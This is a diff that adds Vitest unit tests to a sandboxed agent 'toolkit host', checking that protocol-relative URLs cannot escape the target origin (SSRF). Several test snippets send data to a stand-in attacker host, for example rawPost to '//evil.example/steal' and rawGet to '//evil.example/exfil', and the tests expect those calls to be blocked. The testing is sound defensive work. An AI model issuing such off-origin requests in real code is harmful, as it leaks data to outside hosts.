@@ -1,10 +1,64 @@
-// Integration tests for the toolkit host — requires live AgentGate
+// Tests for the toolkit host
 
 import "dotenv/config";
 import { describe, it, expect, beforeAll } from "vitest";
 import { executeInSandbox } from "../../src/sandbox/executor";
 import { generateKeyPairSync, randomUUID } from "node:crypto";
 import { signRequest } from "../../src/agentgate-client";
+
+// ---------------------------------------------------------------------------
+// SSRF origin-escape prevention (unit — no live AgentGate needed)
+// ---------------------------------------------------------------------------
+
+describe("toolkit-host — SSRF origin validation", () => {
+  it("rejects paths that escape target origin via protocol-relative URL", { timeout: 20000 }, async () => {
+    const result = await executeInSandbox(
+      `async function novelAttack(toolkit) {
+        const r = await toolkit.signedPost("//evil.example/foo", { probe: true });
+        return { caught: false, reason: "request was not blocked" };
+      }`,
+    );
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("SSRF blocked");
+  });
+
+  it("rejects origin-escaping paths in rawPost", { timeout: 20000 }, async () => {
+    const result = await executeInSandbox(
+      `async function novelAttack(toolkit) {
+        await toolkit.rawPost("//evil.example/steal", { data: "leaked" });
+        return { caught: false, reason: "request was not blocked" };
+      }`,
+    );
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("SSRF blocked");
+  });
+
+  it("rejects origin-escaping paths in rawGet", { timeout: 20000 }, async () => {
+    const result = await executeInSandbox(
+      `async function novelAttack(toolkit) {
+        await toolkit.rawGet("//evil.example/exfil");
+        return { caught: false, reason: "request was not blocked" };
+      }`,
+    );
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("SSRF blocked");
+  });
+
+  it("allows normal paths that stay on the target origin", { timeout: 20000 }, async () => {
+    const result = await executeInSandbox(
+      `async function novelAttack(toolkit) {
+        const r = await toolkit.rawGet("/v1/health");
+        return { caught: true, reason: "got status " + r.status };
+      }`,
+    );
+
+    expect(result.success).toBe(true);
+    expect(result.result?.caught).toBe(true);
+  });
+});
 
 function base64UrlToBase64(value: string): string {
   return Buffer.from(value, "base64url").toString("base64");
